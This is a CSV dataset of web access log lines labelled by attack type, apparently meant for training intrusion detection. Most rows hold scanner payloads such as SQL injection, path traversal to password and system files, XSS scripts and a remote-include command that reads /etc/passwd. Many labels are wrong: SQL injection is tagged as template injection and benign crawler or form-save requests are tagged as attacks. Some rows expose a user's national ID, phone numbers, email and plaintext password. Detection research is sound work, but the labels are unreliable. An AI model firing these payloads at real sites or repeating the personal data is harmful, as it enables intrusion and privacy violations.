source,text
"5.119.121.173 - - [22/Jan/2019:08:04:14 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""https://www.zanbil.ir/filter/b36,p6"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:35 +0330] ""GET /item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>; HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:40:14 +0330] ""GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1"" 403 258 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:59 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:51:21 +0330] ""GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1"" 404 227 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:24:46 +0330] ""GET /cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 1018 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:57:00 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20AND%205505%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285505%3D5505%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%286355%3D6355 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:26:36 +0330] ""GET /examples/jsp/colors/SPT--ForumTopics.php?forumid=-9 UNION SELECT null,null,null,1331904464,4,5 HTTP/1.1"" 404 1075 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:49:23 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:05 +0330] ""GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini HTTP/1.1"" 404 7620 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:55:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20MILz&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:18:32:35 +0330] ""GET /SPT--ForumTopics.php?forumid=-9 UNION SELECT null,null,null,1331919223,4,5 HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET / HTTP/1.1"" 302 312 ""-"" ""<script>foo</script>"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:14:23:24 +0330] ""GET /examples/jsp/jsp2/jspx/forum.php?id_article=1&id_forum=-1/**/UNION/**/SELECT 29837577-- HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.138 - - [17/Mar/2012:19:17:22 +0330] ""GET /index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1332008329',null,null,null,null -- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:23:24 +0330] ""GET /examples/jsp/jsp2/jspx/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 1161509000-- HTTP/1.1"" 404 311 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:18:28:53 +0330] ""GET /cgi-bin/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:14:26:01 +0330] ""GET /examples/jsp/error/index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,041990139546,4,5,6,7,8,9,10,11-- HTTP/1.1"" 404 306 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:26:25 +0330] ""GET /examples/jsp/jsp2/jspx/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331904452,1216266359 -- HTTP/1.1"" 404 310 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:23:25 +0330] ""GET /forum.php?id_article=1&id_forum=-1/**/UNION/**/SELECT 1662680530-- HTTP/1.1"" 404 982 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:22:10 +0330] ""GET /phpmyadmin/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd HTTP/1.1"" 404 311 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.138 - - [17/Mar/2012:19:17:08 +0330] ""GET /scripts/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 309 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:49:57 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.0"" 404 151 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:38 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20AND%20SLEEP%285%29%20AND%20%28%27xMrK%27%3D%27xMrK HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:59:47 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:54:28 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%20ORDER%20BY%203293--%20kHdo&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:20 +0330] ""GET //../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:25 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:25:51 +0330] ""GET /cgi-bin/index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:26:41 +0330] ""GET /examples/jsp/sessions/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 315 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:16:48:38 +0330] ""GET /en-US/account/SPT--ForumTopics.php?forumid=-9 UNION SELECT null,null,null,1331912986,4,5 HTTP/1.1"" 404 311 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:59:27 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:22:48 +0330] ""GET /cgi-bin/plog-download.php?dl_type=album&checked[]=' UNION SELECT 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 --  HTTP/1.1"" 404 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:18:28:46 +0330] ""GET /cisco/services/PhoneDirectory.php?ID=-817' UNION SELECT 0,0,0,0,concat(0x74,0x72,0x69,0x78,0x62,0x6f,0x78,0x5f,0x63,0x69,0x73,0x63,0x6f,0x5f,0x70,0x68,0x6f,0x6e,0x65,0x64,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x5f,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),0,0 -- ' HTTP/1.1"" 404 311 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:59:16 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:18:29:05 +0330] ""GET /scripts/cal_event.php?id=1' UNION SELECT 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13-- HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:49:21 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:57:57 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20UNION%20ALL%20SELECT%20NULL--%20UeaW HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:45:06 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 283 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:43:28 +0330] ""GET /cgi-bin/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 308 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:56:38 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%203212%3D6813 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.172.152.13 - - [24/Mar/2018:19:25:55 +0330] ""GET /DomainFiles/*//../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:56 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2885%29%7C%7CCHR%2869%29%7C%7CCHR%2866%29%2C5%29%20FROM%20DUAL--&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:59:24 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.172.152.13 - - [24/Mar/2018:19:25:55 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../etc/passwd HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:51 +0330] ""GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:33 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:59:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:42:11 +0330] ""GET /<script>foo</script> HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:41:57 +0330] ""GET /popuplargeimage.asp?strImageTag=<script>foo</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:49:51 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:53:24 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20AND%201139%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:37 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20AND%20SLEEP%285%29%20AND%20%288091%3D8091 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:02 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:51:13 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [23/Mar/2018:19:01:24 +0330] ""GET /favicon.ico../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 173 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:25:51 +0330] ""GET /index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null -- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.164.94.120 - - [24/Mar/2018:18:15:54 +0330] ""GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd\x00 HTTP/1.1"" 301 56 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:52:41 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 400 661 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:55:15 +0330] ""GET /../../../../../../../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:58 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:53:13 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20AND%201123%3D1123%20AND%20%27ecfU%27%3D%27ecfU&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.118 - - [16/Mar/2012:17:32:42 +0330] ""GET /gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/w94AiIpe?&cmd=cat/etc/passwd HTTP/-"" - 0 ""-"" ""-"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /_vti_bin/..\xc0/..\xc0/..\xc0/..\xc0/..\xc0/../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:23:00:17 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:17 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.114.198.74 - - [22/Jan/2019:10:56:43 +0330] ""GET /customer/savePersonalInfo?id=130766&version=3&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D9%87%D8%B3%D8%A7&lastName=%D8%A7%D9%85%D8%AA%DB%8C&nationalCode=0012366226&mobile=09123181875&telephone=22957931&jobTitle=other&sexSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/profile"" ""Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"93.114.30.18 - - [24/Jan/2019:14:36:15 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%A7%D8%B1%D8%B4&lastName=%D8%A7%D8%B3%D8%A7%DB%8C%D8%B4&username=aas27741%40gmail.com&mobile=09103450207&password=1424&password2=1424&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:40:13 +0330] ""GET /WebID/IISWebAgentIF.dll?postdata=""><script>foo</script> HTTP/1.1"" 404 316 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:40:15 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 243 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.241 - - [23/Mar/2018:19:00:07 +0330] ""GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../var/register/system/ldap/rootpw HTTP/1.1"" 404 984 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"" ""-""",Local File Inclusion
"40.77.252.231 - - [25/Jan/2019:03:04:46 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [25/Mar/2018:00:25:10 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/1.1"" 404 7615 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
